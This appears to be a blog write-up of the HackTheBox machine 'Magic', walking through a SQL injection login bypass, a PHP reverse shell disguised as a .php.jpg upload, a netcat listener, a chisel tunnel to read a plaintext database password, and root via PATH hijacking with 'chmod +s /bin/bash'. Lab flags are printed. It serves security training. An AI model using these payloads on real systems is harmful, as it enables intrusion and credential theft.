---
title: "Magic"
date: 2025-05-19
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Magic

![](../assets/Pasted%20image%2020250519225835.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.185
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 23:06 CEST
Nmap scan report for 10.10.10.185
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.32 ms 10.10.14.1
2   40.62 ms 10.10.10.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds
```

Port `80` shows a site about magic pictures made in `PHP`.

![](../assets/Pasted%20image%2020250519231718.png)

Searching the bottom right number (it's hex for magic), we find information about a PHP type juggling vulnerability.

There is a login form at `/login.php` that is vulnerable to SQLi.

![](../assets/Pasted%20image%2020250519231941.png)

Intercept the request with `Caido` and put `' OR '1'='1'-- -` in the password field to bypass authentication.

![](../assets/Pasted%20image%2020250520001804.png)

![](../assets/Pasted%20image%2020250520001731.png)

## Initial Access

To bypass the file whitelist (`jpg`, `jpeg`, `png`), put a PHP reverse shell in a normal jpg file.

![](../assets/Pasted%20image%2020250520100330.png)

Upload the file with a double extension `.php.jpg` and go to the path where all images are uploaded: `/images/uploads/`.

![](../assets/Pasted%20image%2020250520104057.png)

So, put a bash reverse shell and start a listener.

![](../assets/Pasted%20image%2020250520131228.png)

```shell
$ sudo rlwrap nc -lnvp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 51236
bash: cannot set terminal process group (1229): Inappropriate ioctl for device
bash: no job control in this shell
www-data@magic:/var/www/Magic/images/uploads$ whoami
whoami
www-data
www-data@magic:/var/www/Magic/images/uploads$ 
```

## Privilege Escalation

Examining the app, we find the database config.

![](../assets/Pasted%20image%2020250520133333.png)

And there is a `mysql` instance on `3306`.

```shell
ss -ntplu
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
udp    UNCONN   0        0                 0.0.0.0:54434          0.0.0.0:*     
udp    UNCONN   0        0                 0.0.0.0:5353           0.0.0.0:*     
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*     
udp    UNCONN   0        0                 0.0.0.0:68             0.0.0.0:*     
udp    UNCONN   0        0                 0.0.0.0:631            0.0.0.0:*     
udp    UNCONN   0        0                    [::]:5353              [::]:*     
udp    UNCONN   0        0                    [::]:53480             [::]:*     
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*     
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*     
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*     
tcp    LISTEN   0        5               127.0.0.1:631            0.0.0.0:*     
tcp    LISTEN   0        128                     *:80                   *:*     
tcp    LISTEN   0        128                  [::]:22                [::]:*     
tcp    LISTEN   0        5                   [::1]:631               [::]:*
```

So, expose the port with `chisel`.

```shell
$ ./chisel server --port 5555 --reverse
2025/05/20 13:50:12 server: Reverse tunnelling enabled
2025/05/20 13:50:12 server: Fingerprint zxld6D6IlWWZXhFcL+dvetmj/NbXygDLvjuOJoR6IaQ=
2025/05/20 13:50:12 server: Listening on http://0.0.0.0:5555
2025/05/20 13:50:24 server: session#1: tun: proxy#R:3306=>localhost:3306: Listening

www-data@magic:/tmp$ ./chisel client 10.10.14.11:5555 R:3306:localhost:3306
./chisel client 10.10.14.11:5555 R:3306:localhost:3306
2025/05/20 04:43:07 client: Connecting to ws://10.10.14.11:5555
2025/05/20 04:43:08 client: Connected (Latency 44.137534ms)
```

And connect to the database.

```shell
$ mysql -u theseus -P 3306 -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10214
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
2 rows in set (0.043 sec)

MySQL [(none)]> use magic;
ERROR 1044 (42000): Access denied for user 'theseus'@'localhost' to database 'magic'
MySQL [(none)]> use Magic;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Magic]> show tables;
+-----------------+
| Tables_in_Magic |
+-----------------+
| login           |
+-----------------+
1 row in set (0.043 sec)

MySQL [Magic]> select * from login;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
1 row in set (0.041 sec)

MySQL [Magic]> exit
Bye
```

Pivot to `theseus`:

```shell
www-data@magic:/var/www/Magic/images/uploads$ su - theseus
su - theseus
Password: Th3s3usW4sK1ng

theseus@magic:~$ whoami
whoami                                                                                          
theseus
```

Get the flag

```shell
theseus@magic:~$ cat user.txt
cat user.txt
8892373356de16931deba839326cf201
```

![](../assets/Pasted%20image%2020250520140539.png)

Using `ltrace` on `sysinfo` we notice

![](../assets/Pasted%20image%2020250520182234.png)

It calls `fdisk` without the full path.

```shell
$ cat fdisk
chmod +s /bin/bash
```

Add `/tmp` to the user's path and execute:

```shell
theseus@magic:/tmp$ export PATH="/tmp:$PATH"
export PATH="/tmp:$PATH"
theseus@magic:/tmp$ syinfo
syinfo
```

```shell
theseus@magic:/tmp$ ls -alh /bin/bash
ls -alh /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

```shell
theseus@magic:/tmp$ bash -p
bash -p
bash-4.4# whoami
whoami
root
```

## Post Exploitation

```shell
cat root.txt
bcc1fd50a588e421e53dc5e054de001a
```
